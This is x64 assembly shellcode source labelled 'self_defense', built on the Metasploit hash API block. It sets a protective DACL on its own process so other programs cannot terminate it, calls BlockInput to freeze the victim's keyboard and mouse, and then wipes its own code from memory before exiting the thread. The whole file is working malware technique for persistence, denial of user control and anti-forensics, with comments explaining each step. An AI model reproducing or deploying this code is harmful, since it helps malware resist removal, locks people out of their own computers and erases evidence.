[BITS 64]
[ORG 0]
 
 
self_defense:
	cld                             ; Clear direction flags
    call start          
	%include "./blocks/block_api.asm"; Stephen Fewer's hash API from metasploit project
start:
	pop rbp                           ; Pop the address of hash_api.asm
	mov r10d,0x62C64749               ; hash(kernel32.dll, GetCurrentProcessId())
	call rbp                          ; GetCurrentProcessId()
	mov r8,rax                        ; Process ID
	mov rdx, qword 0x00               ; FALSE
	mov rcx,qword 0x1F00FF            ; PROCESS_ALL_ACCESS
	mov r10d,0x50B695EE               ; hash(kernel32.dll, OpenProcess)
	call rbp                          ; OpenProcess(PROCESS_ALL_ACCESS,FALSE,ECX)
	mov rbx, rax                      ; Move process handle to RBX
	push byte 0x00                    ; NULL
	mov rax, 0x3233697061766461       ; 23ipavda -> RAX 
	push rax                          ; 23ipavda -> STACK
	mov rcx,rsp                       ; Move the address of "advapi32" string to RDX
	mov r10d,0x0726774C               ; hash(kernel32.dll, LoadLibraryA)
	call rbp                          ; LoadLibraryA("advapi32")
	push qword 0x00503a44             ; "D:P"
	mov rcx,rsp                       ; Move the address of StringSecurityDescriptor to RCX
	mov rdx,qword 0x01                ; SDDL_REVISION_1 
	push qword 0x00                   ; SECURITY_ATTRIBUTES.bInheritHandle = NULL
	push qword 0x00                   ; SECURITY_ATTRIBUTES.lpSecurityDescriptor = NULL
	mov rax,0x0000000000000018        ; SECURITY_ATTRIBUTES.nLength = 0x18
	push rax                          ; ...
	lea r8,[rsp+8]                    ; &(SECURITY_ATTRIBUTES.lpSecurityDescriptor) -> R8
	mov rdi,r8                        ; Save the address of security descriptor pointer to EDI
	mov r9,qword 0x00                 ; SecurityDescriptorSize
	mov r10d,0xDA6F639A               ; hash("advapi32.dll", "ConvertStringSecurityDescriptorToSecurityDescriptorA")
	sub rsp,16
	call rbp                          ; ConvertStringSecurityDescriptorToSecurityDescriptorA(&"D:P",StringSDRevision,SecurityDescriptor,SecurityDescriptorSize) 
	mov rcx,rbx                       ; Handle
	mov rdx,qword 0x00000004          ; SecurityInformation
	mov rdi,[rdi]                     ; Get the lpSecurityDescriptor to RDI
	mov r8,rdi                        ; SecurityDescriptor
	mov r10d,0xD63AF8DB               ; hash(kernel32.dll, SetKernelObjectSecurity)
	call rbp                          ; SetKernelObjectSecurity(ProcessHandle,DACL_SECURITY_INFORMATION,SecurityDescriptor) 

	; BlockInput
	push 0x006c6c                   ; 0x00,ll
	mov rax,0x642e323372657375      ; d.23resu
	push rax                        ; "user32.dll"
	mov rcx,rsp                     ; Set the &"user32.dll" to RCX
	mov r10d,0x0726774C             ; hash("KERNEL32.dll" , "LoadLibraryA")
	call rbp                        ; LoadLibraryA("user32.dll")
	mov r10d,0x46670AAE             ; hash(kernel32.dll, BlockInput())
	mov rcx,qword 0x1               ; TRUE
	call rbp                        ; BlockInput(TRUE)
	; Save the RtlExitUserThread address
	push 0x006c                     ; 0x00,l
	mov rax,0x6c642e6c6c64746e      ; l.lldtn
	push rax                        ; "ntdll.dll"
	mov rcx,rsp                     ; Save the &"ntdll.dll" to RCX
	mov r10d,0x0726774C             ; hash("KERNEL32.dll","LoadLibraryA")
	call rbp                        ; LoadLibraryA("ntdll.dll")
	mov rcx,rax                     ; Save the ntdll.dll handle to RCX
	push 0x0064                     ; 0x00,d
	mov rax,0x6165726854726573      ; aerhTres
	push rax                        ; "serThrea"
	mov rax,0x55746978456c7452      ; UtixEltR
	push rax                        ; "RtlExitU"
	mov rdx,rsp                     ; Save the &"RtlExitUserThread" to RDX
	mov r10d,0x7802F749             ; hash("KERNEL32.dll", "GetProcAddress")
	call rbp	                    ; GetProcAddress(HANDLE,"RtlExitUserThread")
	mov rbp,rax	                    ; Save the RtlExitUserThread address to RBP
total_size equ $-self_defense
	call $+5                        ; Push the current address to stack
	pop rax                         ; Pop the current EIP address to RAX
	mov rcx,total_size              ; Set the total size of the self defense shellcode to RCX
clean:
	mov byte [rax],0x00             ; Wipe 1 byte
	dec rax                         ; Decrease index 1 byte
	loop clean                      ; Loop until all shellcode is wiped from memory
	push 0x00                       ; 0
	call rbp                        ; RtlUserExitThread(0)
